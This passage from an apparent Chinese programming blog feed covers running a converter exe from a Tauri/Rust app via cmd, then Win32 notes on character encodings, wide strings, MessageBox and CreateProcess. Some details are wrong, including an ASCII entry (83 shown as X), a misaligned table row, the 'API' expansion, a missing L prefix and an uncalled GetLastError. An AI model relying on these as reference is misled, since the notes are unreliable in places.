selected&quot;</span>))</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样获取的就是文件的绝对路径，每行一个（可选择多个文件）</p>
<p>然后js接收到再转成一个数组进行后续操作即可</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">convertMultilineTextToArray</span>(<span class="params">text</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> text.<span class="title function_">split</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>2.因为拿到了一个类似于命令行工具，所以在传参数的时候出了一些小插曲</p>
</blockquote>
<p>一开始是这样传的参数：</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">args_F</span> = <span class="built_in">format!</span>(<span class="string">&quot;/C chcp 65001 &gt;nul &amp;&amp; t1.exe convert \&quot;&#123;&#125;\&quot; -m t2.exe&quot;</span>, name);</span><br></pre></td></tr></table></figure>

<p>因为文件名参数中可能包含空格，所以就format的时候加了两个引号，但是没有起作用</p>
<p>调试了一下午才发现，<code>/C</code>需要放在<code>chcp</code>的后边，放在<code>t1.exe ...</code>的前面才生效（添加<code>/C</code>处理包含空格的情况）</p>
<p>也就变成了：</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> std::process::Command;</span><br><span class="line"><span class="keyword">use</span> std::os::windows::process::CommandExt;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[tauri::command]</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">spawn_exe</span>(name: &amp;<span class="type">str</span>) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;<span class="type">String</span>, <span class="type">String</span>&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">output</span> = Command::<span class="title function_ invoke__">new</span>(<span class="string">&quot;cmd&quot;</span>)</span><br><span class="line">        .<span class="title function_ invoke__">creation_flags</span>(<span class="number">0x08000000</span>)</span><br><span class="line">        .<span class="title function_ invoke__">arg</span>(<span class="string">&quot;chcp 65001 &gt;nul&quot;</span>)</span><br><span class="line">        .<span class="title function_ invoke__">arg</span>(<span class="string">&quot;&amp;&amp;&quot;</span>)</span><br><span class="line">        .<span class="title function_ invoke__">arg</span>(<span class="string">&quot;/C&quot;</span>)</span><br><span class="line">        .<span class="title function_ invoke__">arg</span>(<span class="string">&quot;t1.exe&quot;</span>)</span><br><span class="line">        .<span class="title function_ invoke__">arg</span>(<span class="string">&quot;convert&quot;</span>)</span><br><span class="line">        .<span class="title function_ invoke__">arg</span>(name)</span><br><span class="line">        .<span class="title function_ invoke__">arg</span>(<span class="string">&quot;-m&quot;</span>)</span><br><span class="line">        .<span class="title function_ invoke__">arg</span>(<span class="string">&quot;t2.exe&quot;</span>)</span><br><span class="line">        .<span class="title function_ invoke__">output</span>()</span><br><span class="line">        .<span class="title function_ invoke__">expect</span>(<span class="string">&quot;failed to execute process&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> output.status.<span class="title function_ invoke__">success</span>() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">Ok</span>(<span class="type">String</span>::<span class="title function_ invoke__">from_utf8_lossy</span>(&amp;output.stdout).<span class="title function_ invoke__">to_string</span>());</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">Ok</span>(<span class="type">String</span>::<span class="title function_ invoke__">from_utf8_lossy</span>(&amp;output.stderr).<span class="title function_ invoke__">to_string</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>3.MessageBox出现乱码</p>
</blockquote>
<p>Cargo.toml需要添加一个</p>
<figure class="highlight toml"><table><tr><td class="code"><pre><span class="line"><span class="attr">widestring</span> = <span class="string">&quot;0.4&quot;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> winapi::um::winuser::&#123;MessageBoxW, MB_OK&#125;;</span><br><span class="line"><span class="keyword">use</span> widestring::WideCString;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[tauri::command]</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">converting</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">title</span> = WideCString::<span class="title function_ invoke__">from_str</span>(<span class="string">&quot;提示&quot;</span>).<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">message</span> = WideCString::<span class="title function_ invoke__">from_str</span>(<span class="string">&quot;正在转换，请稍候...&quot;</span>).<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">    <span class="keyword">unsafe</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">MessageBoxW</span>(<span class="title function_ invoke__">null_mut</span>(), message.<span class="title function_ invoke__">as_ptr</span>(), title.<span class="title function_ invoke__">as_ptr</span>(), MB_OK);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后使用<code>MessageBoxW</code>就没问题了</p>
]]></content>
  </entry>
  <entry>
    <title>Win32API</title>
    <url>/2024/07/05/Win32API/</url>
    <content><![CDATA[<h1 id="Win32API"><a href="#Win32API" class="headerlink" title="Win32API"></a>Win32API</h1><span id="more"></span>

<h2 id="字符编码"><a href="#字符编码" class="headerlink" title="字符编码"></a>字符编码</h2><h3 id="ASCII-码表"><a href="#ASCII-码表" class="headerlink" title="ASCII 码表"></a>ASCII 码表</h3><table>
<thead>
<tr>
<th><strong>ASCII值</strong></th>
<th><strong>控制字符</strong></th>
<th><strong>ASCII值</strong></th>
<th><strong>控制字符</strong></th>
<th><strong>ASCII值</strong></th>
<th><strong>控制字符</strong></th>
<th><strong>ASCII值</strong></th>
<th><strong>控制字符</strong></th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>NUL</td>
<td>32</td>
<td>(space)</td>
<td>64</td>
<td>@</td>
<td>96</td>
<td>、</td>
</tr>
<tr>
<td>1</td>
<td>SOH</td>
<td>33</td>
<td>！</td>
<td>65</td>
<td>A</td>
<td>97</td>
<td>a</td>
</tr>
<tr>
<td>2</td>
<td>STX</td>
<td>34</td>
<td>”</td>
<td>66</td>
<td>B</td>
<td>98</td>
<td>b</td>
</tr>
<tr>
<td>3</td>
<td>ETX</td>
<td>35</td>
<td>#</td>
<td>67</td>
<td>C</td>
<td>99</td>
<td>c</td>
</tr>
<tr>
<td>4</td>
<td>EOT</td>
<td>36</td>
<td>$</td>
<td>68</td>
<td>D</td>
<td>100</td>
<td>d</td>
</tr>
<tr>
<td>5</td>
<td>ENQ</td>
<td>37</td>
<td>%</td>
<td>69</td>
<td>E</td>
<td>101</td>
<td>e</td>
</tr>
<tr>
<td>6</td>
<td>ACK</td>
<td>38</td>
<td>&amp;</td>
<td>70</td>
<td>F</td>
<td>102</td>
<td>f</td>
</tr>
<tr>
<td>7</td>
<td>BEL</td>
<td>39</td>
<td>‘</td>
<td>71</td>
<td>G</td>
<td>103</td>
<td>g</td>
</tr>
<tr>
<td>8</td>
<td>BS</td>
<td>40</td>
<td>(</td>
<td>72</td>
<td>H</td>
<td>104</td>
<td>h</td>
</tr>
<tr>
<td>9</td>
<td>HT</td>
<td>41</td>
<td>)</td>
<td>73</td>
<td>I</td>
<td>105</td>
<td>i</td>
</tr>
<tr>
<td>10</td>
<td>LF</td>
<td>42</td>
<td>*</td>
<td>74</td>
<td>J</td>
<td>106</td>
<td>j</td>
</tr>
<tr>
<td>11</td>
<td>VT</td>
<td>43</td>
<td>+</td>
<td>75</td>
<td>K</td>
<td>107</td>
<td>k</td>
</tr>
<tr>
<td>12</td>
<td>FF</td>
<td>44</td>
<td>,</td>
<td>76</td>
<td>L</td>
<td>108</td>
<td>l</td>
</tr>
<tr>
<td>13</td>
<td>CR</td>
<td>45</td>
<td>-</td>
<td>77</td>
<td>M</td>
<td>109</td>
<td>m</td>
</tr>
<tr>
<td>14</td>
<td>SO</td>
<td>46</td>
<td>.</td>
<td>78</td>
<td>N</td>
<td>110</td>
<td>n</td>
</tr>
<tr>
<td>15</td>
<td>SI</td>
<td>47</td>
<td>&#x2F;</td>
<td>79</td>
<td>O</td>
<td>111</td>
<td>o</td>
</tr>
<tr>
<td>16</td>
<td>DLE</td>
<td>48</td>
<td>0</td>
<td>80</td>
<td>P</td>
<td>112</td>
<td>p</td>
</tr>
<tr>
<td>17</td>
<td>DCI</td>
<td>49</td>
<td>1</td>
<td>81</td>
<td>Q</td>
<td>113</td>
<td>q</td>
</tr>
<tr>
<td>18</td>
<td>DC2</td>
<td>50</td>
<td>2</td>
<td>82</td>
<td>R</td>
<td>114</td>
<td>r</td>
</tr>
<tr>
<td>19</td>
<td>DC3</td>
<td>51</td>
<td>3</td>
<td>83</td>
<td>X</td>
<td>115</td>
<td>s</td>
</tr>
<tr>
<td>20</td>
<td>DC4</td>
<td>52</td>
<td>4</td>
<td>84</td>
<td>T</td>
<td>116</td>
<td>t</td>
</tr>
<tr>
<td>21</td>
<td>NAK</td>
<td>53</td>
<td>5</td>
<td>85</td>
<td>U</td>
<td>117</td>
<td>u</td>
</tr>
<tr>
<td>22</td>
<td>SYN</td>
<td>54</td>
<td>6</td>
<td>86</td>
<td>V</td>
<td>118</td>
<td>v</td>
</tr>
<tr>
<td>23</td>
<td>TB</td>
<td>55</td>
<td>7</td>
<td>87</td>
<td>W</td>
<td>119</td>
<td>w</td>
</tr>
<tr>
<td>24</td>
<td>CAN</td>
<td>56</td>
<td>8</td>
<td>88</td>
<td>X</td>
<td>120</td>
<td>x</td>
</tr>
<tr>
<td>25</td>
<td>EM</td>
<td>57</td>
<td>9</td>
<td>89</td>
<td>Y</td>
<td>121</td>
<td>y</td>
</tr>
<tr>
<td>26</td>
<td>SUB</td>
<td>58</td>
<td>:</td>
<td>90</td>
<td>Z</td>
<td>122</td>
<td>z</td>
</tr>
<tr>
<td>27</td>
<td>ESC</td>
<td>59</td>
<td>;</td>
<td>91</td>
<td>[</td>
<td>123</td>
<td>{</td>
</tr>
<tr>
<td>28</td>
<td>FS</td>
<td>60</td>
<td>&lt;</td>
<td>92</td>
<td>\</td>
<td>124</td>
<td>|</td>
</tr>
<tr>
<td>29</td>
<td>GS</td>
<td>61</td>
<td>&#x3D;</td>
<td>93</td>
<td>]</td>
<td>125</td>
<td>}</td>
</tr>
<tr>
<td>30</td>
<td>RS</td>
<td>62</td>
<td>&gt;</td>
<td>94</td>
<td>^</td>
<td>126</td>
<td>~</td>
</tr>
<tr>
<td>31</td>
<td>US</td>
<td>63</td>
<td>?</td>
<td>95</td>
<td>—</td>
<td>127</td>
<td>DEL</td>
</tr>
</tbody></table>
<h3 id="ASCII扩展码表"><a href="#ASCII扩展码表" class="headerlink" title="ASCII扩展码表"></a>ASCII扩展码表</h3><table>
<thead>
<tr>
<th><strong>十进制</strong></th>
<th><strong>十六进制</strong></th>
<th><strong>字符</strong></th>
<th><strong>十进制</strong></th>
<th><strong>十六进制</strong></th>
<th><strong>字符</strong></th>
</tr>
</thead>
<tbody><tr>
<td>128</td>
<td>80</td>
<td>Ç</td>
<td>192</td>
<td>C0</td>
<td>└</td>
</tr>
<tr>
<td>129</td>
<td>81</td>
<td>ü</td>
<td>193</td>
<td>C1</td>
<td>┴</td>
</tr>
<tr>
<td>130</td>
<td>82</td>
<td>é</td>
<td>194</td>
<td>C2</td>
<td>┬</td>
</tr>
<tr>
<td>131</td>
<td>83</td>
<td>â</td>
<td>195</td>
<td>C3</td>
<td>├</td>
</tr>
<tr>
<td>132</td>
<td>84</td>
<td>ä</td>
<td>196</td>
<td>C4</td>
<td>─</td>
</tr>
<tr>
<td>133</td>
<td>85</td>
<td>à</td>
<td>197</td>
<td>C5</td>
<td>┼</td>
</tr>
<tr>
<td>134</td>
<td>86</td>
<td>å</td>
<td>198</td>
<td>C6</td>
<td>╞</td>
</tr>
<tr>
<td>135</td>
<td>87</td>
<td>ç</td>
<td>199</td>
<td>C7</td>
<td>╟</td>
</tr>
<tr>
<td>136</td>
<td>88</td>
<td>ê</td>
<td>200</td>
<td>C8</td>
<td>╚</td>
</tr>
<tr>
<td>137</td>
<td>89</td>
<td>ë</td>
<td>201</td>
<td>C9</td>
<td>╔</td>
</tr>
<tr>
<td>138</td>
<td>8A</td>
<td>è</td>
<td>202</td>
<td>CA</td>
<td>╩</td>
</tr>
<tr>
<td>139</td>
<td>8B</td>
<td>ï</td>
<td>203</td>
<td>CB</td>
<td>╦</td>
</tr>
<tr>
<td>140</td>
<td>8C</td>
<td>î</td>
<td>204</td>
<td>CC</td>
<td>╠</td>
</tr>
<tr>
<td>141</td>
<td>8D</td>
<td>ì</td>
<td>205</td>
<td>CD</td>
<td>═</td>
</tr>
<tr>
<td>142</td>
<td>8E</td>
<td>Ä</td>
<td>206</td>
<td>CE</td>
<td>╬</td>
</tr>
<tr>
<td>143</td>
<td>8F</td>
<td>Å</td>
<td>207</td>
<td>CF</td>
<td>╧</td>
</tr>
<tr>
<td>144</td>
<td>90</td>
<td>É</td>
<td>208</td>
<td>D0</td>
<td>╨</td>
</tr>
<tr>
<td>145</td>
<td>91</td>
<td>æ</td>
<td>209</td>
<td>D1</td>
<td>╤</td>
</tr>
<tr>
<td>146</td>
<td>92</td>
<td>Æ</td>
<td>210</td>
<td>D2</td>
<td>╥</td>
</tr>
<tr>
<td>147</td>
<td>93</td>
<td>ô</td>
<td>211</td>
<td>D3</td>
<td>╙</td>
</tr>
<tr>
<td>148</td>
<td>94</td>
<td>ö</td>
<td>212</td>
<td>D4</td>
<td>Ô</td>
</tr>
<tr>
<td>149</td>
<td>95</td>
<td>ò</td>
<td>213</td>
<td>D5</td>
<td>╒</td>
</tr>
<tr>
<td>150</td>
<td>96</td>
<td>û</td>
<td>214</td>
<td>D6</td>
<td>╓</td>
</tr>
<tr>
<td>151</td>
<td>97</td>
<td>ù</td>
<td>215</td>
<td>D7</td>
<td>╫</td>
</tr>
<tr>
<td>152</td>
<td>98</td>
<td>ÿ</td>
<td>216</td>
<td>D8</td>
<td>╪</td>
</tr>
<tr>
<td>153</td>
<td>99</td>
<td>Ö</td>
<td>217</td>
<td>D9</td>
<td>┘</td>
</tr>
<tr>
<td>154</td>
<td>9A</td>
<td>Ü</td>
<td>218</td>
<td>DA</td>
<td>┌</td>
</tr>
<tr>
<td>155</td>
<td>9B</td>
<td>¢</td>
<td>219</td>
<td>DB</td>
<td>█</td>
</tr>
<tr>
<td>156</td>
<td>9C</td>
<td>£</td>
<td>220</td>
<td>DC</td>
<td>▄</td>
</tr>
<tr>
<td>157</td>
<td>9D</td>
<td>¥</td>
<td>221</td>
<td>DD</td>
<td>▌</td>
</tr>
<tr>
<td>158</td>
<td>9E</td>
<td>?</td>
<td>222</td>
<td>DE</td>
<td>?</td>
</tr>
<tr>
<td>159</td>
<td>9F</td>
<td>ƒ</td>
<td>223</td>
<td>DF</td>
<td>?</td>
</tr>
<tr>
<td>160</td>
<td>A0</td>
<td>á</td>
<td>224</td>
<td>E0</td>
<td>α</td>
</tr>
<tr>
<td>161</td>
<td>A1</td>
<td>í</td>
<td>225</td>
<td>E1</td>
<td>ß</td>
</tr>
<tr>
<td>162</td>
<td>A2</td>
<td>ó</td>
<td>226</td>
<td>E2</td>
<td>Γ</td>
</tr>
<tr>
<td>163</td>
<td>A3</td>
<td>ú</td>
<td>227</td>
<td>E3</td>
<td>π</td>
</tr>
<tr>
<td>164</td>
<td>A4</td>
<td>ñ</td>
<td>228</td>
<td>E4</td>
<td>Σ</td>
</tr>
<tr>
<td>165</td>
<td>A5</td>
<td>Ñ</td>
<td>229</td>
<td>E5</td>
<td>σ</td>
</tr>
<tr>
<td>166</td>
<td>A6</td>
<td>ª</td>
<td>230</td>
<td>E6</td>
<td>µ</td>
</tr>
<tr>
<td>167</td>
<td>A7</td>
<td>º</td>
<td>231</td>
<td>E7</td>
<td>τ</td>
</tr>
<tr>
<td>168</td>
<td>A8</td>
<td>¿</td>
<td>232</td>
<td>E8</td>
<td>Φ</td>
</tr>
<tr>
<td>169</td>
<td>A9</td>
<td>?</td>
<td>233</td>
<td>E9</td>
<td>Θ</td>
</tr>
<tr>
<td>170</td>
<td>AA</td>
<td>¬</td>
<td>234</td>
<td>EA</td>
<td>Ω</td>
</tr>
<tr>
<td>171</td>
<td>AB</td>
<td>½</td>
<td>235</td>
<td>EB</td>
<td>δ</td>
</tr>
<tr>
<td>172</td>
<td>AC</td>
<td>¼</td>
<td>236</td>
<td>EC</td>
<td>∞</td>
</tr>
<tr>
<td>173</td>
<td>AD</td>
<td>¡</td>
<td>237</td>
<td>ED</td>
<td>φ</td>
</tr>
<tr>
<td>174</td>
<td>AE</td>
<td>«</td>
<td>238</td>
<td>EE</td>
<td>ε</td>
</tr>
<tr>
<td>175</td>
<td>AF</td>
<td>»</td>
<td>239</td>
<td>EF</td>
<td>∩</td>
</tr>
<tr>
<td>176</td>
<td>B0</td>
<td>?</td>
<td>240</td>
<td>F0</td>
<td>≡</td>
</tr>
<tr>
<td>177</td>
<td>B1</td>
<td>?</td>
<td>241</td>
<td>F1</td>
<td>±</td>
</tr>
<tr>
<td>178</td>
<td>B2</td>
<td>▓</td>
<td>242</td>
<td>F2</td>
<td>≥</td>
</tr>
<tr>
<td>179</td>
<td>B3</td>
<td>│</td>
<td>243</td>
<td>F3</td>
<td>≤</td>
</tr>
<tr>
<td>180</td>
<td>B4</td>
<td>┤</td>
<td>244</td>
<td>F4</td>
<td>?</td>
</tr>
<tr>
<td>181</td>
<td>B5</td>
<td>╡</td>
<td>245</td>
<td>F5</td>
<td>?</td>
</tr>
<tr>
<td>182</td>
<td>B6</td>
<td>╢</td>
<td>246</td>
<td>F6</td>
<td>÷</td>
</tr>
<tr>
<td>183</td>
<td>B7</td>
<td>╖</td>
<td>247</td>
<td>F7</td>
<td>≈</td>
</tr>
<tr>
<td>184</td>
<td>B8</td>
<td>╕</td>
<td>248</td>
<td>F8</td>
<td>≈</td>
</tr>
<tr>
<td>185</td>
<td>B9</td>
<td>╣</td>
<td>249</td>
<td>F9</td>
<td>?</td>
</tr>
<tr>
<td>186</td>
<td>BA</td>
<td>║</td>
<td>250</td>
<td>FA</td>
<td>·</td>
</tr>
<tr>
<td>187</td>
<td>BB</td>
<td>╗</td>
<td>251</td>
<td>FB</td>
<td>√</td>
</tr>
<tr>
<td>188</td>
<td>BC</td>
<td>╝</td>
<td>252</td>
<td>FC</td>
<td>?</td>
</tr>
<tr>
<td>189</td>
<td>BD</td>
<td>╜</td>
<td>253</td>
<td>FD</td>
<td>²</td>
</tr>
<tr>
<td>190</td>
<td>BE</td>
<td>╛</td>
<td>FE</td>
<td>■</td>
<td></td>
</tr>
<tr>
<td>191</td>
<td>BF</td>
<td>┐</td>
<td>255</td>
<td>FF</td>
<td>ÿ</td>
</tr>
</tbody></table>
<h3 id="Unicode字符集"><a href="#Unicode字符集" class="headerlink" title="Unicode字符集"></a>Unicode字符集</h3><p>UNICODE编码方案，世界上所有的文字符号都能从这张表中找到。Unicode编码范围是0~0x10FFFF，能容纳1114111个字符。</p>
<p>但是Unicode只是一个字符集，它规定了每个字符对应的二进制，但是没有规定如何存储。</p>
<p>Unicode的存储方式有UTF-8和UTF-16</p>
<h4 id="UTF-8"><a href="#UTF-8" class="headerlink" title="UTF-8"></a>UTF-8</h4><p>UTF-8是变长字符编码。</p>
<table>
<thead>
<tr>
<th>Unicode编码（HEX）</th>
<th>UTF-8字节流（BIN）</th>
</tr>
</thead>
<tbody><tr>
<td>000000 - 00007F</td>
<td>0xxxxxxx</td>
</tr>
<tr>
<td>000080 - 0007FF</td>
<td>110xxxxx 10xxxxxx</td>
</tr>
<tr>
<td>000800 - 00FFFF</td>
<td>1110xxxx 10xxxxxx 10xxxxxx</td>
</tr>
<tr>
<td>010000 - 10FFFF</td>
<td>11110xxx 10xxxxxx 10xxxxxx 10xxxxxx</td>
</tr>
</tbody></table>
<h4 id="UTF-16"><a href="#UTF-16" class="headerlink" title="UTF-16"></a>UTF-16</h4><p>UTF-16编码以16位无符号整数为单位，（是以16位为一个单位，不表示一个字符就有16位）。这要看字符的Unicode编码处于什么范围而定，有可能是2个字节，有可能是4个字节。现在机器上的Unicode编码一般指的是UTF-16编码</p>
<h3 id="BOM"><a href="#BOM" class="headerlink" title="BOM"></a>BOM</h3><p>BOM，BYTE Order Mark，字符排列标志。</p>
<table>
<thead>
<tr>
<th>编码方式</th>
<th>BOM</th>
</tr>
</thead>
<tbody><tr>
<td>UTF-8</td>
<td>EF BB BF</td>
</tr>
<tr>
<td>UTF-16LE（小端对齐</td>
<td>FF FE</td>
</tr>
<tr>
<td>UTF-16BE（大端对齐</td>
<td>FE FF</td>
</tr>
</tbody></table>
<h3 id="C语言中的宽字符"><a href="#C语言中的宽字符" class="headerlink" title="C语言中的宽字符"></a>C语言中的宽字符</h3><h4 id="宽字符"><a href="#宽字符" class="headerlink" title="宽字符"></a>宽字符</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">wchar_t</span> wch[] = <span class="string">&quot;宽字符&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>打印宽字符：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;locale.h&gt;</span>				<span class="comment">//添加头文件</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	setlocale(LC_ALL, <span class="string">&quot;&quot;</span>);		<span class="comment">// 控制台使用默认编码</span></span><br><span class="line">	<span class="type">wchar_t</span> wch[] = <span class="string">L&quot;宽字符&quot;</span>;</span><br><span class="line">	wprintf(<span class="string">L&quot;%s\n&quot;</span>, wch);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h4><table>
<thead>
<tr>
<th>char</th>
<th>wchar_t</th>
<th>多字节字符型 &#x2F; 宽字节字符型</th>
</tr>
</thead>
<tbody><tr>
<td>printf</td>
<td>wprintf</td>
<td>打印到控制台</td>
</tr>
<tr>
<td>strlen</td>
<td>wcslen</td>
<td>获取长度</td>
</tr>
<tr>
<td>strcpy</td>
<td>wcscpy</td>
<td>字符串复制</td>
</tr>
<tr>
<td>strcat</td>
<td>wcscat</td>
<td>字符串拼接</td>
</tr>
<tr>
<td>strcmp</td>
<td>wcscmp</td>
<td>字符串比较</td>
</tr>
<tr>
<td>strstr</td>
<td>wcsstr</td>
<td>字符串查找</td>
</tr>
</tbody></table>
<h3 id="Win32-API中的宽字符"><a href="#Win32-API中的宽字符" class="headerlink" title="Win32 API中的宽字符"></a>Win32 API中的宽字符</h3><h4 id="Win32-API"><a href="#Win32-API" class="headerlink" title="Win32 API"></a>Win32 API</h4><p>API，Application Process Interface应用程序接口，也就是Windows提供的封装好的一些函数</p>
<p>几个重要DLL：</p>
<p>&lt;1&gt;Kernel32.dll最核心的功能模块，比如管理内存、进程和线程相关的函数等。<br>&lt;2&gt;User32.dll是Vindows用户界面相关应用程序接口，如创建窗口和发送消息等。<br>&lt;3&gt;GDl32.dll全称是Graphical Device Interface(图形设备接口)，包含用于画图和显示文本的函数。</p>
<p>在Win32中写代码最好用TCHAR来写，利于跨平台使用</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">CHAR ch[] = <span class="string">&quot;&quot;</span>;				<span class="comment">//char</span></span><br><span class="line">WCHAR wch[] = <span class="string">L&quot;&quot;</span>;			<span class="comment">//wchar_t</span></span><br><span class="line"></span><br><span class="line">TCHAR tch[] = TEXT(<span class="string">&quot;&quot;</span>);		<span class="comment">// 依赖于程序默认的编码，是ASCII就是ASCII，是Unicode就是Unicode</span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">指针类型</span><br><span class="line">PSTR pszStr = <span class="string">&quot;&quot;</span>;				<span class="comment">//char*</span></span><br><span class="line">PWSTR pwszStr = <span class="string">L&quot;&quot;</span>;			<span class="comment">//wchar_t*</span></span><br><span class="line"></span><br><span class="line">PTSTR ptszStr = TEXT(<span class="string">&quot;&quot;</span>);		<span class="comment">//兼容</span></span><br></pre></td></tr></table></figure>

<h4 id="MessageBox-API"><a href="#MessageBox-API" class="headerlink" title="MessageBox API"></a>MessageBox API</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">CHAR chTitle[] = <span class="string">&quot;标题&quot;</span>;</span><br><span class="line">CHAR chText[] = <span class="string">&quot;内容&quot;</span>;</span><br><span class="line">MessageBoxA(<span class="number">0</span>,chText,chTitle,MB_YESNO);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">WCHAR wchTitle[] = <span class="string">L&quot;标题&quot;</span>;</span><br><span class="line">WCHAR wchText[] = <span class="string">L&quot;内容&quot;</span>;</span><br><span class="line">MessageBoxW(<span class="number">0</span>,wchText,wchTitle,MB_YESNO);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">TCHAR chTitle[] = TEXT(<span class="string">&quot;标题&quot;</span>);</span><br><span class="line">TCHAR chText[] = TEXT(<span class="string">&quot;内容&quot;</span>);</span><br><span class="line">MessageBox(<span class="number">0</span>,chText,chTitle,MB_YESNO);</span><br></pre></td></tr></table></figure>

<h2 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h2><h3 id="进程的创建"><a href="#进程的创建" class="headerlink" title="进程的创建"></a>进程的创建</h3><p>任何进程都是别的进程创建的：由CreateProcess()这个函数创建</p>
<p>进程创建过程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、映射EXE文件</span><br><span class="line">2、创建内核对象EPROCESS</span><br><span class="line">3、映射系统DLL(ntdll.dll)</span><br><span class="line">4、创建线程内核对象ETHREAD</span><br><span class="line">5、系统启动线程</span><br><span class="line">		映射DLL(ntdl.LdrInitializeThunk)</span><br><span class="line">		线程开始执行</span><br></pre></td></tr></table></figure>

<h3 id="创建进程"><a href="#创建进程" class="headerlink" title="创建进程"></a>创建进程</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">BOOL <span class="title function_">CreateChildProcess</span><span class="params">(PTCHAR szChildProcessName, PTCHAR szCommandLine)</span></span><br><span class="line">&#123;</span><br><span class="line">	STARTUPINFO si;					<span class="comment">// 记录程序有多大</span></span><br><span class="line">	PROCESS_INFORMATION pi;</span><br><span class="line"></span><br><span class="line">	ZeroMemory(&amp;pi, <span class="keyword">sizeof</span>(pi));</span><br><span class="line">	ZeroMemory(&amp;si, <span class="keyword">sizeof</span>(si));</span><br><span class="line">	si.cb = <span class="keyword">sizeof</span>(si);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 创建子进程，返回成功与失败</span></span><br><span class="line">	<span class="keyword">if</span> (!CreateProcess(</span><br><span class="line">		szChildProcessName,		<span class="comment">// 对象名称</span></span><br><span class="line">		szCommandLine,			<span class="comment">// 命令行</span></span><br><span class="line">		<span class="literal">NULL</span>,					<span class="comment">// 不继承进程句柄</span></span><br><span class="line">		<span class="literal">NULL</span>,					<span class="comment">// 不继承线程句柄</span></span><br><span class="line">		FALSE,					<span class="comment">// 不继承句柄</span></span><br><span class="line">		<span class="number">0</span>,						<span class="comment">// 没有创建标志</span></span><br><span class="line">		<span class="literal">NULL</span>,					<span class="comment">// 使用父进程环境变量</span></span><br><span class="line">		<span class="literal">NULL</span>,					<span class="comment">// 使用父进程目录作为当前目录，可以自己设置目录</span></span><br><span class="line">		&amp;si,					<span class="comment">// STARTUPINFO结构体详细信息</span></span><br><span class="line">		&amp;pi)					<span class="comment">// PROCESS_INFORMATION结构体进程信息</span></span><br><span class="line">		)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;CreatChildProcess Error:%d \n&quot;</span>, GetLastError);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	CloseHandle(pi.hProcess);</span><br><span class="line">	CloseHandle(pi.hThread);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	TCHAR szApplicationName[] = TEXT(<span class="string">&quot;C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe&quot;</span>);</span><br><span class="line">	TCHAR szCmdline[] = TEXT(<span class="string">&quot;https://baidu.com&quot;</span>);</span><br><span class="line">	CreateChildProcess(szApplicationName, <span class="literal">NULL</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

